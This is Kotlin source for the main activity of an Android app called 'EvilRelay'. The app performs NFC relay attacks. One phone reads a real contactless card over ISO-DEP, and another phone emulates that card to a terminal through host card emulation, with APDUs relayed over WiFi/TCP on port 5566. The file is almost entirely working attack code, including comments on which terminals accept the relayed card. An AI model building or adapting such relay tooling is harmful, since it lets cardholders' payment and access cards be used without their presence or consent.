package com.evil.relay

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.res.ColorStateList
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.nfc.NfcAdapter
import android.nfc.Tag
import android.nfc.tech.IsoDep
import android.nfc.tech.NfcA
import android.os.Bundle
import android.provider.Settings
import android.widget.RadioGroup
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.google.android.material.textfield.TextInputEditText
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.ServerSocket
import java.net.Socket
import kotlin.concurrent.thread

/*
 * EvilRelay - NFC relay app, two roles:
 *
 *  Reader   : this phone READS the real card (IsoDep) and relays APDUs over WiFi/TCP
 *             to the emulator (a Cardputer, or another phone in Emulator mode).
 *  Emulator : this phone EMULATES the card to a terminal via HCE and forwards the
 *             terminal's APDUs over WiFi/TCP to a Reader (phone or Cardputer).
 *
 * This enables all three combos: Cardputer+Cardputer, Cardputer+phone, phone+phone.
 * The emulator is the TCP server (port 5566); the reader is the client.
 *
 * HCE limit: Android sets its own random UID and does not expose ATS/SAK, so a phone
 * emulator presents Android's identity, not the real card's. The APDU layer is relayed
 * fully. Some terminals accept this, RRP-strict terminals will not.
 */
class MainActivity : AppCompatActivity(), NfcAdapter.ReaderCallback {

    private var nfc: NfcAdapter? = null
    private lateinit var statusText: TextView
    private lateinit var statusDot: android.view.View
    private lateinit var ipInput: TextInputEditText
    private lateinit var cardUid: TextView
    private lateinit var apduCount: TextView
    private lateinit var logText: TextView
    private lateinit var roleGroup: RadioGroup

    private val port = 5566
    @Volatile private var emulator = false
    @Volatile private var serverRunning = false
    private var server: ServerSocket? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        statusDot = findViewById(R.id.statusDot)
        ipInput = findViewById(R.id.ipInput)
        cardUid = findViewById(R.id.cardUid)
        apduCount = findViewById(R.id.apduCount)
        logText = findViewById(R.id.logText)
        roleGroup = findViewById(R.id.roleGroup)

        Relay.logSink = { s -> logln(s) }
        nfc = NfcAdapter.getDefaultAdapter(this)

        roleGroup.setOnCheckedChangeListener { _, id ->
            emulator = (id == R.id.roleEmulator)
            applyRole()
        }

        if (nfc == null) {
            setStatus("No NFC on this phone", R.color.err)
        }
    }

    override fun onResume() {
        super.onResume()
        checkNfcEnabled()
        checkWifi()
        applyRole()
    }

    override fun onPause() {
        super.onPause()
        nfc?.disableReaderMode(this)
        stopServer()
    }

    // ---- role switching ----
    private fun applyRole() {
        nfc?.disableReaderMode(this)
        stopServer()
        apduCount(0)
        if (emulator) {
            startServer()
            val ip = localIp()
            setStatus("Emulator - waiting reader", R.color.warn)
            cardUid.text = "Listen $ip:$port"
            logln("Emulator (HCE) mode. Reader connects to $ip:$port. Then tap the terminal.")
        } else {
            val opts = Bundle().apply { putInt(NfcAdapter.EXTRA_READER_PRESENCE_CHECK_DELAY, 5000) }
            nfc?.enableReaderMode(
                this, this,
                NfcAdapter.FLAG_READER_NFC_A or NfcAdapter.FLAG_READER_SKIP_NDEF_CHECK, opts
            )
            setStatus("Reader - place a card", R.color.warn)
            cardUid.text = "-"
            logln("Reader mode. Target emulator IP: " + hostIp())
        }
    }

    // ============================ READER ============================
    override fun onTagDiscovered(tag: Tag) {
        if (emulator) return
        val iso = IsoDep.get(tag) ?: run { setStatus("Card not ISO-DEP", R.color.err); return }
        val nfca = NfcA.get(tag)
        try {
            iso.timeout = 5000
            iso.connect()
            val uid = tag.id ?: ByteArray(0)
            val atqa = nfca?.atqa ?: byteArrayOf(0x04, 0x00)
            val sak = (nfca?.sak?.toInt() ?: 0x20)
            val hist = iso.historicalBytes ?: ByteArray(0)
            val ats = buildAts(hist)
            setStatus("Card detected", R.color.cyan)
            runOnUiThread { cardUid.text = "UID ${Relay.hex(uid)}  SAK %02X".format(sak) }

            val host = hostIp()
            Socket(host, port).use { sock ->
                sock.tcpNoDelay = true
                val out = sock.getOutputStream()
                val inp = sock.getInputStream()
                val ident = ArrayList<Byte>()
                ident.add(uid.size.toByte()); uid.forEach { ident.add(it) }
                ident.add(atqa.getOrElse(0) { 0 }); ident.add(atqa.getOrElse(1) { 0 })
                ident.add(sak.toByte())
                ident.add(ats.size.toByte()); ats.forEach { ident.add(it) }
                Relay.sendFrame(out, 1, 0, ident.toByteArray())
                setStatus("Relay active", R.color.ok)
                logln("Emulator $host connected - relay active")
                var count = 0
                while (iso.isConnected && !sock.isClosed) {
                    val f = Relay.readFrame(inp) ?: break
                    if (f.type.toInt() and 0xFF == 2) {
                        val resp = try { iso.transceive(f.payload) }
                        catch (e: Exception) { setStatus("Card lost", R.color.err); break }
                        Relay.sendFrame(out, 3, f.seq.toInt(), resp)
                        count++; val c = count
                        runOnUiThread { apduCount.text = c.toString() }
                        if (count <= 16) logln("APDU #$count  ${f.payload.size}B -> ${resp.size}B")
                    }
                }
                logln("Session ended ($count APDU)")
                if (count > 0) setStatus("Done - $count APDU", R.color.cyan) else setStatus("Reader - place a card", R.color.warn)
            }
        } catch (e: Exception) {
            setStatus("Network error", R.color.err)
            logln("err: ${e.message}  (WiFi joined? correct peer IP?)")
        } finally { try { iso.close() } catch (_: Exception) {} }
    }

    // ============================ EMULATOR ============================
    private fun startServer() {
        serverRunning = true
        thread(name = "relay-srv") {
            try {
                val ss = ServerSocket(port); server = ss; ss.soTimeout = 0
                while (serverRunning) {
                    val c = try { ss.accept() } catch (e: Exception) { break }
                    try {
                        c.tcpNoDelay = true
                        val f = Relay.readFrame(c.getInputStream())   // IDENT (card identity; HCE uses Android's own UID)
                        Relay.readerSocket = c
                        if (f != null && f.type.toInt() and 0xFF == 1)
                            logln("Reader linked (card IDENT ${f.payload.size}B) - tap the terminal now")
                        else logln("Reader linked - tap the terminal now")
                        setStatus("Emulator ready - tap terminal", R.color.ok)
                    } catch (e: Exception) {
                        logln("reader link err: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                logln("server err: ${e.message}")
            }
        }
    }

    private fun stopServer() {
        serverRunning = false
        try { server?.close() } catch (_: Exception) {}
        server = null
        try { Relay.readerSocket?.close() } catch (_: Exception) {}
        Relay.readerSocket = null
    }

    // ---- checks ----
    private fun checkNfcEnabled() {
        val a = nfc ?: return
        if (!a.isEnabled) {
            AlertDialog.Builder(this)
                .setTitle("NFC is off")
                .setMessage("Enable NFC to relay. Open NFC settings?")
                .setPositiveButton("Open settings") { _, _ ->
                    try { startActivity(Intent(Settings.ACTION_NFC_SETTINGS)) }
                    catch (e: Exception) { startActivity(Intent(Settings.ACTION_SETTINGS)) }
                }
                .setNegativeButton("Later", null)
                .show()
            setStatus("NFC is off", R.color.err)
        }
    }

    private fun checkWifi(): Boolean {
        val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager ?: return false
        val net = cm.activeNetwork
        val cap = cm.getNetworkCapabilities(net)
        val wifi = cap?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true
        if (!wifi) logln("Warning: not on WiFi. Join the relay WiFi / hotspot.")
        return wifi
    }

    private fun localIp(): String {
        try {
            for (ni in NetworkInterface.getNetworkInterfaces()) {
                if (!ni.isUp || ni.isLoopback) continue
                for (addr in ni.inetAddresses) {
                    if (addr is Inet4Address && !addr.isLoopbackAddress) return addr.hostAddress ?: "?"
                }
            }
        } catch (_: Exception) {}
        return "?"
    }

    private fun hostIp(): String =
        ipInput.text?.toString()?.trim().let { if (it.isNullOrEmpty()) "192.168.4.1" else it }

    // ATS wrapping the real historical bytes (reader mode only; Android does not expose raw ATS).
    private fun buildAts(hist: ByteArray): ByteArray {
        val body = byteArrayOf(0x78.toByte(), 0x80.toByte(), 0xE0.toByte(), 0x00) + hist
        return byteArrayOf((1 + body.size).toByte()) + body
    }

    private fun apduCount(n: Int) { Relay.apduCount = n; runOnUiThread { apduCount.text = n.toString() } }

    private fun setStatus(text: String, colorRes: Int) = runOnUiThread {
        statusText.text = text
        statusDot.backgroundTintList = ColorStateList.valueOf(ContextCompat.getColor(this, colorRes))
    }

    private fun logln(s: String) = runOnUiThread { logText.append(s + "\n") }
}
